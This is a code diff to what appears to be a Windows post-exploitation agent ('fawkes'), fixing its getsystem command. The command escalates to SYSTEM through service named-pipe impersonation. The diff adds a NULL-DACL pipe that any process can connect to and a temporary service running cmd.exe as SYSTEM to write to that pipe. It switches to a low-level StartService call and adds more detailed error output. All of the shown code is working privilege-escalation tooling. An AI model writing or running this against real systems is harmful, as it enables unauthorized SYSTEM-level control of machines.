@@ -8,6 +8,7 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"os"
 	"runtime"
 	"strings"
 	"unsafe"
@@ -81,6 +82,27 @@ func (c *GetSystemCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 }
 
+// createPermissiveSA creates a SECURITY_ATTRIBUTES with a NULL DACL,
+// allowing any process (including SYSTEM) to connect to the pipe.
+func createPermissiveSA() (*windows.SecurityAttributes, *windows.SECURITY_DESCRIPTOR, error) {
+	sd, err := windows.NewSecurityDescriptor()
+	if err != nil {
+		return nil, nil, fmt.Errorf("NewSecurityDescriptor: %v", err)
+	}
+
+	// Set a NULL DACL — allows all access
+	if err := sd.SetDACL(nil, true, false); err != nil {
+		return nil, nil, fmt.Errorf("SetDACL: %v", err)
+	}
+
+	sa := &windows.SecurityAttributes{
+		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
+		SecurityDescriptor: sd,
+		InheritHandle:      0,
+	}
+	return sa, sd, nil
+}
+
 // getSystemViaService creates a named pipe, creates a Windows service whose
 // binpath writes to that pipe (running as SYSTEM), then impersonates the
 // connecting client to obtain a SYSTEM token.
@@ -100,6 +122,16 @@ func getSystemViaService(oldIdentity string) structs.CommandResult {
 		}
 	}
 	pipeFullPath := `\\.\pipe\` + pipeName
+
+	// Create permissive security descriptor (NULL DACL) to allow SYSTEM to connect
+	sa, _, err := createPermissiveSA()
+	if err != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Failed to create security descriptor: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
 
 	// Create an event for overlapped I/O
 	hEvent, _, eventErr := procCreateEventW.Call(0, 1, 0, 0) // manual reset, initially non-signaled
@@ -130,7 +162,7 @@ func getSystemViaService(oldIdentity string) structs.CommandResult {
 		512,  // out buffer size
 		512,  // in buffer size
 		5000, // default timeout (5s)
-		0,    // default security (allows SYSTEM)
+		uintptr(unsafe.Pointer(sa)),
 	)
 	if hPipe == uintptr(windows.InvalidHandle) {
 		return structs.CommandResult{
@@ -165,8 +197,13 @@ func getSystemViaService(oldIdentity string) structs.CommandResult {
 	alreadyConnected := (connectErr == windows.ERROR_PIPE_CONNECTED)
 
 	// Create a temporary service that writes to our pipe
+	// Full path to cmd.exe avoids PATH lookup issues under SCM
 	svcName := "fwk" + pipeName[:8]
-	binPath := fmt.Sprintf(`cmd.exe /c echo fawkes > %s`, pipeFullPath)
+	systemRoot := os.Getenv("SystemRoot")
+	if systemRoot == "" {
+		systemRoot = `C:\Windows`
+	}
+	binPath := fmt.Sprintf(`%s\System32\cmd.exe /c echo fawkes > %s`, systemRoot, pipeFullPath)
 
 	scm, err := mgr.Connect()
 	if err != nil {
@@ -197,16 +234,16 @@ func getSystemViaService(oldIdentity string) structs.CommandResult {
 	}()
 
 	// Start the service — the SCM will run cmd.exe as SYSTEM which connects to our pipe
-	// Start() returns quickly; the error is expected because cmd.exe isn't a real service
-	svcHandle.Start()
-	// Ignore error — cmd.exe is not a real service and will fail to report status
+	// Use low-level StartService which returns immediately (doesn't wait for RUNNING state)
+	startErr := windows.StartService(svcHandle.Handle, 0, nil)
+	_ = startErr // Expected to return an error eventually but the process still runs
 
 	// Wait for the pipe connection (overlapped I/O)
 	if !alreadyConnected {
 		waitResult, _ := windows.WaitForSingleObject(windows.Handle(hEvent), 10000) // 10s timeout
 		if waitResult != windows.WAIT_OBJECT_0 {
 			return structs.CommandResult{
-				Output:    "Timeout waiting for service to connect to pipe (10s). Ensure you have SeImpersonate and admin privileges.",
+				Output:    fmt.Sprintf("Timeout waiting for service to connect to pipe (10s). Ensure you have SeImpersonate and admin privileges. Service: %s, binpath: %s, startErr: %v", svcName, binPath, startErr),
 				Status:    "error",
 				Completed: true,
 			}
@@ -284,7 +321,7 @@ func getSystemViaService(oldIdentity string) structs.CommandResult {
 
 	var sb strings.Builder
 	sb.WriteString("Successfully elevated to SYSTEM\n")
-	sb.WriteString(fmt.Sprintf("Technique: Service named pipe impersonation\n"))
+	sb.WriteString("Technique: Service named pipe impersonation\n")
 	if oldIdentity != "" {
 		sb.WriteString(fmt.Sprintf("Old: %s\n", oldIdentity))
 	}
